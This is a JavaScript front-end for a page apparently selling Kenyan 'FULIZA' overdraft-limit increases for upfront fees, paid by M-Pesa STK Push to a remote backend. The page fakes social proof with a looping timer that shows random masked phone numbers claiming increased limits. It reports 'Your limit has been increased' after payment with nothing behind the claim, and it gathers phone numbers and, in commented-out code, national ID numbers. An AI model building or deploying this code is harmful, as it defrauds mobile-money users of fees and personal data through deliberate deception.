// -----------------------
// Demo data (edit these)
// -----------------------
const PACKAGES = [
  { limit: 5000, fee: 49 },
  { limit: 7500, fee: 100 },
  { limit: 10000, fee: 140 },
  { limit: 12500, fee: 160 },
  { limit: 16000, fee: 200 },
  { limit: 20000, fee: 260 },
  { limit: 24500, fee: 310 },
  { limit: 29500, fee: 350 },
  { limit: 33000, fee: 420 },
  { limit: 38500, fee: 490 },
  { limit: 43000, fee: 560 },
  { limit: 50000, fee: 690 },
  { limit: 60000, fee: 980 },
];



const BACKEND_BASE = "https://fuliza-deploy.onrender.com";

const el = (id) => document.getElementById(id);

el("year").textContent = new Date().getFullYear();

const grid = el("grid");
const sumLimit = el("sumLimit");
const sumFee = el("sumFee");
const limitValue = el("limitValue");
const feeValue = el("feeValue");
const statusEl = el("status");
const payBtn = el("payBtn");

// -----------------------
// Modal refs (must exist in index.html)
// -----------------------
const stkModal = el("stkModal");
const closeStkModal = el("closeStkModal");
const modalPackageText = el("modalPackageText");
const modalPayForm = el("modalPayForm");
const modalPayBtn = el("modalPayBtn");
const modalStatus = el("modalStatus");
const idNoEl = el("idNo");
const modalPhoneEl = el("modalPhone");

let selectedPackage = null;

// -----------------------
// Helpers
// -----------------------
function ksh(n) {
  return `KSh ${Number(n).toLocaleString("en-KE")}`;
}

function normalizePhone(phoneRaw) {
  // Accept: 07XXXXXXXX, 01XXXXXXXX, 2547XXXXXXXX, +2547XXXXXXXX
  let p = String(phoneRaw || "").trim().replace(/\s+/g, "");
  if (!p) return null;
  if (p.startsWith("+")) p = p.slice(1);

  if (p.startsWith("0") && p.length === 10) return "254" + p.slice(1);
  if (p.startsWith("254") && p.length === 12) return p;

  return null;
}

function scrollToId(id) {
  document.getElementById(id).scrollIntoView({ behavior: "smooth", block: "start" });
}

// -----------------------
// Payment status polling (shows Success/Failed)
// -----------------------
function normalizeStatus(raw) {
  const s = String(raw || "").toUpperCase();
  // common states we handle:
  // QUEUED, PENDING, PROCESSING, COMPLETED, SUCCESS, FAILED, CANCELLED, REJECTED, TIMEOUT
  return s;
}

function isSuccessStatus(s) {
  return s.includes("COMPLET") || s.includes("SUCCESS") || s === "PAID";
}

function isFailStatus(s) {
  return s.includes("FAIL") || s.includes("CANCEL") || s.includes("REJECT") || s.includes("TIMEOUT");
}

async function pollPaymentStatus(reference, setText) {
  const MAX_ATTEMPTS = 15; // 15 * 3s = ~45 seconds
  const INTERVAL_MS = 3000;

  for (let i = 1; i <= MAX_ATTEMPTS; i++) {
    setText(`Waiting for confirmation... (${i}/${MAX_ATTEMPTS})`);

    await new Promise((r) => setTimeout(r, INTERVAL_MS));

    const res = await fetch(`${BACKEND_BASE}/api/tx-status?reference=${encodeURIComponent(reference)}`);
    const data = await res.json().catch(() => ({}));

    const st = normalizeStatus(data.status || data.payment_status || data.state);

    if (isSuccessStatus(st)) {
      setText("✅ Payment Successful! Your limit has been increased.");
      return "SUCCESS";
    }

    if (isFailStatus(st)) {
      setText("❌ Payment Failed / Cancelled. Please try again.");
      return "FAILED";
    }

    // still queued/pending → continue polling
  }

  setText("ℹ️ Payment not confirmed yet. If you paid, wait a little then try again.");
  return "TIMEOUT";
}

// -----------------------
// Modal open/close
// -----------------------
function openModalForPackage(p) {
  selectedPackage = p;

  // keep your payment summary in sync
  setSelectedPackage(p);

  if (modalPackageText) {
    modalPackageText.textContent = `Selected: FULIZA ${p.limit.toLocaleString("en-KE")} • Fee ${ksh(
      p.fee
    )}. Enter Your ID & phone number to continue.`;
  }
  
  
   // 👇 set fee into input
  if (modalAmountInput) {
    modalAmountInput.value = p.fee; // or ksh(p.fee) if you want formatted
  }
  

  if (modalStatus) modalStatus.textContent = "";
  if (idNoEl) idNoEl.value = "";

  // prefill phone if user already entered before
  if (modalPhoneEl) {
    modalPhoneEl.value = sessionStorage.getItem("mpesaNumber") || el("phone")?.value || "";
  }

  if (stkModal) stkModal.classList.remove("hidden");
  setTimeout(() => idNoEl?.focus(), 50);
}




function closeModal() {
  if (stkModal) stkModal.classList.add("hidden");
}

closeStkModal?.addEventListener("click", closeModal);

stkModal?.addEventListener("click", (e) => {
  if (e.target === stkModal) closeModal();
});

document.addEventListener("keydown", (e) => {
  if (e.key === "Escape" && stkModal && !stkModal.classList.contains("hidden")) {
    closeModal();
  }
});

// -----------------------
// Render packages
// -----------------------
function renderPackages() {
  grid.innerHTML = "";
  PACKAGES.forEach((p, idx) => {
    const card = document.createElement("div");
    card.className = "card";

    card.innerHTML = `
      <div class="card-top">
        <div class="limit">FULIZA ${p.limit.toLocaleString("en-KE")}</div>
        <div class="badge">HOT</div>
      </div>
      <div class="fee">Fee: <strong>${ksh(p.fee)}</strong></div>
      <button class="buy" data-idx="${idx}">Get it now • ${ksh(p.fee)}</button>
    `;
    grid.appendChild(card);
  });

  grid.querySelectorAll(".buy").forEach((btn) => {
    btn.addEventListener("click", () => {
      const p = PACKAGES[Number(btn.dataset.idx)];

      // keep URL selection (optional)
      history.replaceState(null, "", `#payment?limit=${p.limit}&fee=${p.fee}`);

      // open popup instead of scrolling down
      openModalForPackage(p);

      toast(`Selected FULIZA ${p.limit.toLocaleString("en-KE")} • Fee ${ksh(p.fee)}`, true);
    });
  });
}

function setSelectedPackage(p) {
  sumLimit.textContent = `FULIZA ${p.limit.toLocaleString("en-KE")}`;
  sumFee.textContent = ksh(p.fee);
  limitValue.value = String(p.limit);
  feeValue.value = String(p.fee);
}

// Load selection from URL (if shared)
function loadFromHash() {
  const hash = window.location.hash || "";
  if (!hash.includes("?")) return;

  const q = hash.split("?")[1];
  const params = new URLSearchParams(q);
  const limit = Number(params.get("limit"));
  const fee = Number(params.get("fee"));
  if (limit && fee) {
    setSelectedPackage({ limit, fee });
  }
}

renderPackages();
loadFromHash();

// -----------------------
// Nav buttons
// -----------------------
el("ctaBtn")?.addEventListener("click", () => scrollToId("packages"));
el("goPackages")?.addEventListener("click", () => scrollToId("packages"));
el("backToPackages")?.addEventListener("click", () => scrollToId("packages"));

// -----------------------
// Pay form (OLD section still works)
// -----------------------
el("payForm")?.addEventListener("submit", async (e) => {
  e.preventDefault();

  const limit = Number(limitValue.value);
  const fee = Number(feeValue.value);

  if (!limit || !fee) {
    statusEl.textContent = "Please select a FULIZA package first.";
    scrollToId("packages");
    return;
  }

  const normalized = normalizePhone(el("phone")?.value);
  if (!normalized) {
    statusEl.textContent = "Enter a valid Safaricom number e.g. 07XXXXXXXX or 2547XXXXXXXX.";
    return;
  }

  statusEl.textContent = "Sending STK Push… check your phone.";
  payBtn.disabled = true;
  payBtn.textContent = "Processing…";

  try {
    const payload = {
      phone: normalized,
      amount: fee,
      accountReference: `FULIZA-${limit}`,
      description: `FULIZA limit increase to ${limit}`,
    };

    const res = await fetch(`${BACKEND_BASE}/api/stkpush`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    const data = await res.json().catch(() => ({}));

    if (!res.ok) {
      throw new Error(data?.message || "STK Push failed. Try again.");
    }

    statusEl.textContent = "STK Push sent ✅ Enter your M-Pesa PIN on the prompt.";
    toast(`${maskPhone(normalized)} initiated payment • ${ksh(fee)} for FULIZA ${limit}`, true);

    // ✅ POLL STATUS using returned reference
    if (data?.reference) {
      await pollPaymentStatus(data.reference, (txt) => (statusEl.textContent = txt));
    } else {
      statusEl.textContent += " (No reference returned to auto-verify.)";
    }
  } catch (err) {
    statusEl.textContent = String(err.message || err);
    toast("Payment request failed. Please retry.", false);
  } finally {
    payBtn.disabled = false;
    payBtn.textContent = "Pay via STK Push";
  }
});

// -----------------------
// Modal Pay form (ID No + Phone + Pay) + Auto Verify
// -----------------------













// modalPayForm?.addEventListener("submit", async (e) => {
//   e.preventDefault();

//   const limit = Number(limitValue.value);
//   const fee = Number(feeValue.value);

//   const idNo = String(idNoEl?.value || "").trim();
//   if (!idNo || idNo.length < 6) {
//     modalStatus.textContent = "Enter a valid ID number.";
//     return;
//   }

//   const normalized = normalizePhone(modalPhoneEl?.value);
//   if (!normalized) {
//     modalStatus.textContent = "Enter a valid Safaricom number e.g. 07XXXXXXXX or 2547XXXXXXXX.";
//     return;
//   }

//   sessionStorage.setItem("mpesaNumber", modalPhoneEl.value);

//   modalStatus.textContent = "Sending STK Push… check your phone.";
//   modalPayBtn.disabled = true;
//   modalPayBtn.textContent = "Processing…";

//   try {
//     const payload = {
//       phone: normalized,
//       amount: fee,
//       accountReference: `FULIZA-${limit}-ID${idNo}`,
//       description: `FULIZA limit increase to ${limit} (ID ${idNo})`,
//     };

//     const res = await fetch(`${BACKEND_BASE}/api/stkpush`, {
//       method: "POST",
//       headers: { "Content-Type": "application/json" },
//       body: JSON.stringify(payload),
//     });

//     const data = await res.json().catch(() => ({}));

//     if (!res.ok) {
//       throw new Error(data?.message || "STK Push failed. Try again.");
//     }

//     modalStatus.textContent = "STK Push sent ✅ Enter your M-Pesa PIN on the prompt.";
//     toast(`${maskPhone(normalized)} initiated payment • ${ksh(fee)} for FULIZA ${limit}`, true);
//     if (data?.reference) {
//       const result = await pollPaymentStatus(data.reference, (txt) => (modalStatus.textContent = txt));

//       if (result === "SUCCESS") {
//         setTimeout(closeModal, 1800);
//       } else if (result === "FAILED") {
//       }
//     } else {
//       modalStatus.textContent += " (No reference returned to auto-verify.)";
//     }
//   } catch (err) {
//     modalStatus.textContent = String(err.message || err);
//     toast("Payment request failed. Please retry.", false);
//   } finally {
//     modalPayBtn.disabled = false;
//     modalPayBtn.textContent = "Pay via STK Push";
//   }
// });













// -----------------------
// Social proof toasts (keeps running)
// -----------------------
function maskPhone(p254) {
  // p254: 2547xxxxxxxx
  const s = String(p254);
  if (s.length < 12) return "07xxxxxx";
  // show 0706xxxx78 style
  const local = "0" + s.slice(3); // 07xxxxxxxx
  return local.slice(0, 4) + "xxxx" + local.slice(-2);
}

function randomPhone() {
  const prefixes = [
    "0706","0712","0715","0721","0722","0726","0741","0745","0750","0757","0768","0798"
  ];
  const pre = prefixes[Math.floor(Math.random() * prefixes.length)];
  const last2 = String(Math.floor(Math.random() * 100)).padStart(2, "0");
  return `${pre}xxxx${last2}`;
}

function randomLimit() {
  const p = PACKAGES[Math.floor(Math.random() * PACKAGES.length)];
  return p.limit;
}

function toast(message, success = true) {
  const wrap = el("toasts");
  if (!wrap) return;

  const t = document.createElement("div");
  t.className = "toast";
  t.innerHTML = `
    <div class="ticon">${success ? "✓" : "!"}</div>
    <div class="ttext"><strong>${message}</strong><br/>Just now</div>
  `;
  wrap.appendChild(t);

  setTimeout(() => {
    t.style.opacity = "0";
    t.style.transform = "translateY(8px)";
    t.style.transition = "350ms";
    setTimeout(() => t.remove(), 360);
  }, 4200);
}

// loop notifications
setInterval(() => {
  const phone = randomPhone();
  const lim = randomLimit();
  toast(`${phone} increased to Ksh ${lim.toLocaleString("en-KE")} now`, true);
}, 2600);

// initial few toasts
setTimeout(() => toast(`${randomPhone()} increased to Ksh 5,000 now`, true), 800);
setTimeout(() => toast(`${randomPhone()} increased to Ksh 10,000 now`, true), 1600);
setTimeout(() => toast(`${randomPhone()} increased to Ksh 20,000 now`, true), 2400);
